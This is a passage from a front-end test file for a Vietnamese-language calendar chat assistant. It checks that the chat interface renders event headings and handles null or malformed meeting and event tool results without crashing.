      result: { success: true, isMock: true, mode: 'mock', events: [] },
      expectedHeading: 'Sự kiện sắp diễn ra (Lịch mẫu):',
    },
  ])('renders contextual heading for $name', ({ args, result, expectedHeading }) => {
    mockUseChat.mockReturnValue({
      messages: [
        {
          id: 'msg-heading',
          role: 'assistant',
          content: '',
          toolInvocations: [
            {
              toolCallId: 'call-heading',
              toolName: 'listUpcomingEvents',
              state: 'result',
              args,
              result,
            },
          ],
        },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);
    expect(screen.getByText(expectedHeading)).toBeInTheDocument();
  });

  it('does not crash when localStorage-restored proposeMeeting or listUpcomingEvents results are null or malformed', () => {
    const savedSession = createNewSession('guest');
    saveCurrentSession(
      {
        ...savedSession,
        title: 'Phiên có toolInvocation lỗi',
        messages: [
          { id: 'u-bad-1', role: 'user', content: 'Đặt lịch và xem lịch giúp tôi' },
          {
            id: 'a-bad-1',
            role: 'assistant',
            content: 'Đây là thông tin lịch của bạn.',
            toolInvocations: [
              {
                state: 'result',
                toolCallId: 'call-propose-null',
                toolName: 'proposeMeeting',
                args: {},
                result: null,
              },
              {
                state: 'result',
                toolCallId: 'call-propose-missing',
                toolName: 'proposeMeeting',
                args: {},
                result: { summary: 'Thiếu trường bắt buộc' },
              },
              {
                state: 'result',
                toolCallId: 'call-propose-bad-attendees',
                toolName: 'proposeMeeting',
                args: {},
                result: {
                  proposalId: 'p-bad',
                  summary: 'Sai attendees',
                  startDateTime: '2026-11-25T09:00:00+07:00',
                  endDateTime: '2026-11-25T10:00:00+07:00',
                  attendees: 'not-an-array',
                },
              },
              {
                state: 'result',
                toolCallId: 'call-upcoming-null',
                toolName: 'listUpcomingEvents',
                args: {},
                result: null,
              },
              {
                state: 'result',
                toolCallId: 'call-upcoming-bad-events',
                toolName: 'listUpcomingEvents',
                args: {},
                result: { success: true, events: null },
              },
              {
                state: 'result',
                toolCallId: 'call-upcoming-bad-item',
                toolName: 'listUpcomingEvents',
                args: {},
                result: { success: true, events: [{ id: 'broken-only-id' }] },
              },
              {
                state: 'result',
                toolCallId: 'call-upcoming-api-error',
                toolName: 'listUpcomingEvents',
                args: {},
                result: { success: false, error: 'Chưa kết nối tài khoản Google.' },
              },
            ],
          },
        ],
      },
      'guest'
    );

    mockUseChat.mockImplementation(() => {
      const [messages, setMessages] = useState<Message[]>([]);
      return {
        messages,
        setMessages,
        input: '',
        handleInputChange: vi.fn(),
        handleSubmit: vi.fn(),
        isLoading: false,
        error: undefined,
        reload: vi.fn(),
        setInput: vi.fn(),
        stop: vi.fn(),
      };
    });

    render(<ChatInterface isAuthenticated={true} activeSessionId={savedSession.id} />);

    expect(screen.getByText('Đặt lịch và xem lịch giúp tôi')).toBeInTheDocument();
    expect(screen.getByText('Đây là thông tin lịch của bạn.')).toBeInTheDocument();
    expect(
      screen.getAllByText('Dữ liệu bản thảo cuộc họp không hợp lệ hoặc bị thiếu.')
    ).toHaveLength(3);
    expect(
      screen.getAllByText('Dữ liệu lịch trả về không hợp lệ hoặc bị thiếu.')
    ).toHaveLength(3);
    expect(screen.getByText('Chưa kết nối tài khoản Google.')).toBeInTheDocument();
  });
});
